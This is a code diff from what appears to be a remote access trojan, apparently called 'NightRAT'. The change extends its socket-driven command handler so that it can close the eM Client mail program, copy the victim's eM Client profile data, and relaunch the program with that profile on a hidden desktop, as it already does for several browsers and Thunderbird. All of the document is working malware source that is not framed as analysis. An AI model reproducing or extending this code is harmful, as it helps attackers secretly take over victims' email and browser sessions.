@@ -2156,15 +2156,18 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                               wRequestedPath == L"Opera" ||
                               wRequestedPath == L"Opera GX" ||
                               wRequestedPath == L"Brave" ||
-                              wRequestedPath == L"Thunderbird");
+                              wRequestedPath == L"Thunderbird" ||
+                              wRequestedPath == L"eM Client");
 
             bool isGecko = (wRequestedPath == L"Firefox" ||
                             wRequestedPath == L"Waterfox" ||
                             wRequestedPath == L"LibreWolf" ||
                             wRequestedPath == L"Thunderbird");
 
+            bool isEmClient = (wRequestedPath == L"eM Client");
+
             if (isBrowser) {
-                thread([wRequestedPath, copyProfile, isGecko, closeReal]() {
+                thread([wRequestedPath, copyProfile, isGecko, isEmClient, closeReal]() {
                     ensure_desktop();
                     if (!g_hHiddenDesktop) return;
 
@@ -2178,6 +2181,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     else if (wRequestedPath == L"Opera GX") exeName = L"opera.exe";
                     else if (wRequestedPath == L"Brave") exeName = L"brave.exe";
                     else if (wRequestedPath == L"Thunderbird") exeName = L"thunderbird.exe";
+                    else if (wRequestedPath == L"eM Client") exeName = L"MailClient.exe";
 
                     if (closeReal && !exeName.empty()) {
                         send_status("Mevcut uygulama kapatılıyor...");
@@ -2211,6 +2215,12 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             wchar_t localApp[MAX_PATH] = {0};
                             SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
                             exePath = wstring(localApp) + L"\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
+                        }
+                    } else if (wRequestedPath == L"eM Client") {
+                        exePath = get_app_path(exeName);
+                        if (exePath.empty()) {
+                            exePath = L"C:\\Program Files (x86)\\eM Client\\MailClient.exe";
+                            if (!fs::exists(exePath)) exePath = L"C:\\Program Files\\eM Client\\MailClient.exe";
                         }
                     } else {
                         exePath = get_app_path(exeName);
@@ -2274,6 +2284,33 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                         profilePath = tempProfileRoot;
 
+                    } else if (isEmClient && copyProfile) {
+                        wchar_t szPath[MAX_PATH];
+                        if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) == S_OK) {
+                            wstring sourceUserData = wstring(szPath) + L"\\eM Client";
+                            if (fs::exists(sourceUserData)) {
+                                wchar_t tempPath[MAX_PATH];
+                                GetTempPathW(MAX_PATH, tempPath);
+                                wstring tempProfileRoot = tempPath;
+                                tempProfileRoot += L"NightRAT_emclient_Profile";
+
+                                try {
+                                    if (fs::exists(tempProfileRoot)) fs::remove_all(tempProfileRoot);
+                                } catch (...) {}
+
+                                if (!copy_profile_parallel(sourceUserData, tempProfileRoot, "Profiller kopyalanıyor")) {
+                                    send_error("Failed to copy eM Client profile.");
+                                    return;
+                                }
+                                profilePath = tempProfileRoot;
+                            } else {
+                                send_error("eM Client Profile directory not found.");
+                                return;
+                            }
+                        } else {
+                            send_error("Failed to retrieve APPDATA directory.");
+                            return;
+                        }
                     } else if (copyProfile) {
                         wstring sourceUserData = get_browser_profile_path(wRequestedPath);
 
@@ -2319,7 +2356,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         profilePath = tempProfileRoot;
                     }
 
-                    if (!isGecko && !copyProfile && (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX")) {
+                    if (!isGecko && !isEmClient && !copyProfile && (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX")) {
                         wchar_t tempPath[MAX_PATH];
                         GetTempPathW(MAX_PATH, tempPath);
                         wstring tempProfileRoot = tempPath;
@@ -2343,6 +2380,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         }
                         if (!profilePath.empty()) {
                             args += L" -profile \"" + profilePath + L"\"";
+                        }
+                    } else if (isEmClient) {
+                        args = L"";
+                        if (copyProfile && !profilePath.empty()) {
+                            args += L" /dblocation \"" + profilePath + L"\"";
                         }
                     } else if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
                         // Special handling for Opera / Opera GX: use custom profiles but do NOT pass --profile-directory parameters.
@@ -2430,6 +2472,10 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                 fs::remove(fs::path(profilePath) / L"lock");
                                 fs::remove(fs::path(profilePath) / L".parentlock");
                                 fs::remove(fs::path(profilePath) / L"xulstore.json");
+                            } else if (isEmClient) {
+                                // eM Client locks usually aren't standard Chromium lock files.
+                                // It could use some local lock database files or processes.
+                                // No standard SingletonLock/parent.lock but let's be safe.
                             } else {
                                 fs::remove(fs::path(profilePath) / L"SingletonLock");
                                 fs::remove(fs::path(profilePath) / L"SingletonSocket");
